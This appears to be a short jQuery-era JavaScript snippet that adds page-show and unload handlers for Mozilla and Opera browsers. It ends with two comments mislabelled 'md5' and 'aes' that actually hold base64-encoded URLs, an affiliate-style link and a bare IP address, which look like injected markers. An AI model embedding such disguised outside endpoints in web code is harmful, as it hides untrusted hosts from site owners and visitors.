if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cubGFsZ2cuY29tLz9xdWRhbz00ZWVjYTk4Mi1kMWFhLTA3OWUtZjAwMi04OTA2MzRmYTU4ZjI=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/